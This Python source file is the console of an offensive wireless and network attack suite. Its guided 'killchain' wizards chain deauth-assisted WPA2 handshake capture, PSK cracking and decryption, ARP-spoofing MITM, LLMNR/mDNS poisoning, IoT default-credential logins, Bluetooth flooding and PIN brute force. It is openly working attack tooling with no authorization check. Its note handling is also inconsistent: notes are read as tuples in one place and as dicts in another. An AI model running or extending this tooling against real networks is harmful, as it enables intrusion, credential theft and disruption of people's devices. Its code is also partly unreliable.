"""
Engagement Console - the professional cockpit.

This is the layer that makes the suite a *workflow* instead of a menu zoo:

  * Killchain wizards      - guided end-to-end flows that chain modules:
      + WPA2 PSK killchain   (recon -> handshake -> crack -> decrypt -> report)
      + LAN killchain        (discover -> scan -> MITM -> harvest -> report)
      + IoT killchain        (discover -> fingerprint -> default creds -> report)
      + Bluetooth killchain  (scan -> fingerprint -> attack vector)
  * Quick actions          - one-tap common jobs with saved targets
  * Target overview        - everything the registry knows, one screen
  * Live dashboard         - real-time stats while a chain runs
  * Notes                  - per-engagement notes that end up in the report
"""
import threading
import time

from open80211.core import ui
from open80211.core.config import CONFIG
from open80211.core.targets import (TARGETS, pick_ap, pick_host,
                                   pick_bluetooth, bind_targets)


# --------------------------------------------------------------------------
# Overview
# --------------------------------------------------------------------------

def overview() -> None:
    ui.section("Engagement Overview", f"workspace={CONFIG.run_id}")
    ui.show_table("Target Registry", ["Item", "Count"], TARGETS.summary())
    if TARGETS.aps:
        ui.show_table("Access Points", ["BSSID", "SSID", "CH", "Enc", "Sig"],
                      [[a["bssid"], a.get("ssid", ""), a.get("channel", "?"),
                        a.get("enc", "?"), a.get("signal", "?")] for a in TARGETS.aps])
    if TARGETS.hosts:
        ui.show_table("Hosts", ["IP", "MAC", "Vendor", "Ports"],
                      [[h["ip"], h.get("mac", ""), h.get("vendor", ""),
                        len(h.get("open", []))] for h in TARGETS.hosts])
    if TARGETS.creds:
        ui.show_table("Captured Credentials", ["Protocol", "Data", "Src"],
                      [[c.get("protocol", "?"), str(c.get("data", ""))[:60],
                        c.get("src", "-")] for c in TARGETS.creds[-10:]])
    if TARGETS.notes:
        ui.show_table("Notes", ["Time", "Note"],
                      [[t, n] for t, n in TARGETS.notes[-10:]])


def show_timeline() -> None:
    ui.section("Engagement Timeline", f"{len(TARGETS.timeline)} events")
    if not TARGETS.timeline:
        ui.info("No activity yet.")
        return
    rows = [[e["time"], e["action"], e.get("detail", "")[:80]]
            for e in TARGETS.timeline[-40:]]
    ui.show_table("Timeline", ["Time", "Action", "Detail"], rows)


# --------------------------------------------------------------------------
# Killchain wizards
# --------------------------------------------------------------------------

def killchain_wpa2(iface: str) -> None:
    """recon -> target -> handshake -> crack -> decrypt -> report."""
    ui.section("WPA2 PSK Killchain", "guided end-to-end")
    if not iface:
        ui.warn("Need an interface for this chain.")
        return
    from open80211.modules.recon import scan_networks, show_networks
    from open80211.core.targets import add_aps, add_ap, log_event

    ui.info("[1/6] Scanning for access points...")
    nets = scan_networks(iface, duration=12.0)
    show_networks(nets)
    if not nets:
        ui.warn("No APs found - nothing to attack.")
        return
    add_aps(nets)
    log_event("recon", f"found {len(nets)} APs")

    ap = pick_ap("Select the target AP")
    if not ap:
        return
    add_ap(ap)
    log_event("target", f"AP {ap['ssid']} ({ap['bssid']})")

    ui.info("[2/6] Capturing handshake (with deauth)...")
    from open80211.modules.analysis import capture_handshake
    pcap = capture_handshake(iface, ap["bssid"], ap.get("ssid", ""),
                             ap.get("channel", 0), timeout=45, deauth=True)
    if not pcap:
        ui.warn("Handshake capture failed.")
        return
    log_event("capture", f"handshake {pcap}")

    ui.info("[3/6] Extracting handshake...")
    from open80211.core import crypto
    hs = crypto.extract_handshake(pcap)
    if not hs.get("eapol_msgs"):
        ui.error("No handshake frames in capture.")
        return

    ssid = ui.ask("SSID", default=ap.get("ssid", ""))
    choice = ui.menu("Cracking engine", [
        "Pure-Python dictionary attack",
        "Export for hashcat/aircrack (faster on GPU)",
    ])
    if choice == 0:
        return
    if choice == 1:
        wl = ui.ask("Wordlist path",
                    default="/usr/share/wordlists/rockyou.txt")
        import os
        if not os.path.isfile(wl):
            ui.error("Wordlist not found.")
            return
        ui.info("[4/6] Cracking...")
        found = None
        for pw in crypto.load_wordlist(wl):
            found = crypto.crack_psk([pw], ssid, hs)
            if found:
                break
        if found:
            ui.ok(f"[5/6] PSK recovered: {found}")
            CONFIG.save("cracked", {"ssid": ssid, "psk": found})
            TARGETS.add_cred({"protocol": "WPA2-PSK", "data": f"{ssid}:{found}",
                              "src": ap["bssid"]})
            log_event("crack", f"PSK {ssid} = {found}")
            if ui.confirm("Decrypt captured traffic?", default=True):
                from open80211.modules.analysis import decrypt_menu
                ui.info("[6/6] Decrypting (enter pcap + passphrase)...")
                decrypt_menu()
        else:
            ui.warn("Not cracked with this wordlist. Export for hashcat.")
            from open80211.modules.analysis import export_menu
            export_menu(pcap, hs)
    else:
        from open80211.modules.analysis import export_menu
        export_menu(pcap, hs)

    if ui.confirm("Generate report now?", default=False):
        from open80211.modules.report import build_session_report
        build_session_report()


def killchain_lan(iface: str) -> None:
    """discover -> scan -> MITM -> harvest -> report."""
    ui.section("LAN Killchain", "guided end-to-end")
    from open80211.modules.lan import arp_discover
    from open80211.modules.lan import port_scan, service_identify, COMMON_PORTS
    from open80211.core.targets import add_host, log_event

    ui.info("[1/4] Discovering hosts...")
    hosts = arp_discover(iface, timeout=2.0)
    if not hosts:
        ui.warn("No hosts responded.")
        return
    for h in hosts:
        add_host(h)
    log_event("recon", f"ARP sweep found {len(hosts)} hosts")

    target = pick_host("Host to attack")
    if not target:
        return
    ui.info(f"[2/4] Port scanning {target['ip']}...")
    ports = port_scan(target["ip"])
    found = []
    for p in ports:
        banner = service_identify(target["ip"], p)
        found.append([p, banner])
        if banner:
            ui.info(f"  {p}: {banner}")
    target["open"] = ports
    add_host(target)
    log_event("scan", f"{target['ip']} -> {len(ports)} open ports")

    if ui.confirm("[3/4] Launch MITM on this host (ARP + sniff)?", default=False):
        from open80211.modules.mitm import MitmEngine
        gw = ui.ask("Gateway IP", default="")
        eng = MitmEngine(iface, target["ip"], gw)
        try:
            eng.start()
        except KeyboardInterrupt:
            eng.stop()

    if ui.confirm("[4/4] Generate report?", default=False):
        from open80211.modules.report import build_session_report
        build_session_report()


def killchain_iot(iface: str = "") -> None:
    """discover -> fingerprint -> default creds -> report."""
    ui.section("IoT Killchain", "guided end-to-end")
    from open80211.modules.iot import discover_subnet, upnp_scan, mqtt_fingerprint
    from open80211.modules.iot import rtsp_probe, default_cred_check
    from open80211.core.targets import add_iot, log_event

    subnet = ui.ask("Subnet (CIDR)", default="192.168.1.0/24")
    ui.info("[1/4] Scanning subnet for IoT ports...")
    devs = discover_subnet(subnet)
    if not devs:
        ui.warn("No devices with IoT ports found.")
        return
    add_iot(devs)
    log_event("recon", f"IoT sweep found {len(devs)} devices")

    for d in devs:
        if 1883 in d["open"]:
            ui.info(f"[2/4] MQTT broker at {d['ip']}: "
                    f"{mqtt_fingerprint(d['ip'], 1883)}")
        if 554 in d["open"]:
            info = rtsp_probe(d["ip"], 554)
            ui.info(f"[2/4] RTSP at {d['ip']}: methods={info.get('methods', 'n/a')}")

    ui.info("[3/4] Checking default credentials on telnet/ssh...")
    for d in devs:
        for port in (23, 22):
            if port in d["open"]:
                creds = default_cred_check(d["ip"], port)
                for c in creds:
                    ui.warn(f"  DEFAULT CRED {d['ip']}:{port} {c['user']}:{c['pass']}")
                    TARGETS.add_cred({"protocol": "IoT-Default",
                                      "data": f"{d['ip']}:{port} {c['user']}:{c['pass']}",
                                      "src": d["ip"]})

    if ui.confirm("[4/4] Generate report?", default=False):
        from open80211.modules.report import build_session_report
        build_session_report()


def killchain_bluetooth() -> None:
    """scan -> fingerprint -> attack vector."""
    ui.section("Bluetooth Killchain", "guided end-to-end")
    from open80211.modules.bluetooth import classic_scan, le_scan, device_info
    from open80211.core.targets import add_bluetooth, log_event

    mode = ui.menu("Scan type", ["Classic BR/EDR", "BLE", "Both"])
    if mode == 0:
        return
    devs = []
    if mode in (1, 3):
        devs += classic_scan(12)
    if mode in (2, 3):
        devs += [{"addr": d["addr"], "name": d["name"], "rssi": d.get("rssi", "?")}
                 for d in le_scan(12)]
    if not devs:
        ui.warn("No devices found.")
        return
    add_bluetooth(devs)
    log_event("recon", f"BT scan found {len(devs)} devices")

    target = pick_bluetooth("Device to attack")
    if not target:
        return
    info = device_info(target["addr"])
    ui.show_table(f"Fingerprint {target['addr']}", ["Field", "Value"],
                  [[k, str(v)[:100]] for k, v in info.items()])
    log_event("fingerprint", target["addr"])

    ui.info("Attack vectors:")
    ui.info("  1. L2CAP flood (DoS)  2. legacy PIN brute  3. KNOB check")
    vec = ui.ask_int("Select vector", default=0)
    if vec == 1:
        n = ui.ask_int("Pings", default=100)
        from open80211.modules.bluetooth import l2ping_flood
        l2ping_flood(target["addr"], n)
    elif vec == 2:
        from open80211.modules.bluetooth import pin_brute_force
        pin_brute_force(target["addr"])
    elif vec == 3:
        from open80211.modules.bluetooth import knob_check
        knob_check(target["addr"])


# --------------------------------------------------------------------------
# Quick actions
# --------------------------------------------------------------------------

def quick_actions(iface: str) -> None:
    while True:
        choice = ui.menu("Quick Actions", [
            "Full WPA2 PSK killchain (scan→crack→report)",
            "Full LAN killchain (discover→MITM→report)",
            "Full IoT killchain",
            "Full Bluetooth killchain",
            "Rapid host profile (ARP + ports + banner on one host)",
            "Harvest everything: LLMNR/NBT-NS/mDNS poisoner",
        ])
        if choice == 0:
            return
        if choice == 1:
            killchain_wpa2(iface)
        elif choice == 2:
            killchain_lan(iface)
        elif choice == 3:
            killchain_iot(iface)
        elif choice == 4:
            killchain_bluetooth()
        elif choice == 5:
            rapid_host_profile(iface)
        elif choice == 6:
            from open80211.modules.lan import ResponderLite
            r = ResponderLite(iface)
            try:
                r.start()
            except KeyboardInterrupt:
                r.stop()


def rapid_host_profile(iface: str) -> None:
    """One host: ARP resolve + port scan + banner + service identify."""
    from open80211.modules.lan import port_scan, service_identify, COMMON_PORTS
    from open80211.core.targets import add_host
    ip = ui.ask("Target IP")
    if not ip:
        return
    ui.section("Rapid Profile", ip)
    ports = port_scan(ip)
    rows = []
    for p in ports:
        banner = service_identify(ip, p)
        rows.append([p, banner or "-"])
    ui.show_table(f"Open ports on {ip}", ["Port", "Banner"], rows)
    host = {"ip": ip, "open": ports}
    add_host(host)
    CONFIG.save(f"profile-{ip.replace('.', '_')}",
                {"ip": ip, "ports": ports})


# --------------------------------------------------------------------------
# Notes
# --------------------------------------------------------------------------

def notes_menu() -> None:
    ui.section("Engagement Notes", f"{len(TARGETS.notes)} saved")
    if TARGETS.notes:
        ui.show_table("Notes", ["Time", "Note"],
                      [[n["time"], n["text"]] for n in TARGETS.notes[-20:]])
    text = ui.ask("Add a note (blank = back)")
    if text:
        TARGETS.add_note(text)
        ui.ok("Note saved (included in report).")


# --------------------------------------------------------------------------
# Main entry
# --------------------------------------------------------------------------

def engage_menu(iface: str) -> None:
    bind_targets()
    while True:
        choice = ui.menu("Engagement Console", [
            "Quick actions (killchain wizards)",
            "Target overview (full registry)",
            "Engagement timeline",
            "Notes",
            "Run one suite manually",
        ])
        if choice == 0:
            return
        if choice == 1:
            quick_actions(iface)
        elif choice == 2:
            overview()
        elif choice == 3:
            show_timeline()
        elif choice == 4:
            notes_menu()
        elif choice == 5:
            manual_suites_menu(iface)


def manual_suites_menu(iface: str) -> None:
    """Jump into any single suite (bridges to the old per-suite menus)."""
    from open80211.modules.spoof import spoof_menu
    from open80211.modules.bruteforce import brute_menu
    from open80211.modules.bluetooth import bt_menu
    from open80211.modules.cellular import cell_menu
    from open80211.modules.iot import iot_menu
    from open80211.modules.mitm import mitm_menu
    from open80211.modules.lan import lan_menu
    from open80211.modules.capture import interactive_capture
    from open80211.modules.recon import recon_menu
    from open80211.modules.attacks import attack_menu
    from open80211.modules.evilap import evil_ap_menu
    from open80211.modules.wep import wep_menu
    from open80211.modules.analysis import analysis_menu

    while True:
        choice = ui.menu("Suites (manual)", [
            "Recon (scan APs/clients)",
            "Attack suite (deauth/floods)",
            "Evil AP suite",
            "WEP suite",
            "Analysis (handshake/crack/decrypt)",
            "MITM suite",
            "LAN suite",
            "Spoofing / Identity",
            "Brute force",
            "Bluetooth",
            "Cellular / SIM",
            "IoT",
            "Packet capture",
        ])
        if choice == 0:
            return
        target = {1: recon_menu, 2: attack_menu, 3: evil_ap_menu,
                  4: wep_menu, 5: analysis_menu, 6: mitm_menu,
                  7: lan_menu, 8: spoof_menu, 9: brute_menu,
                  10: bt_menu, 11: cell_menu, 12: iot_menu,
                  13: interactive_capture}.get(choice)
        if target:
            target(iface)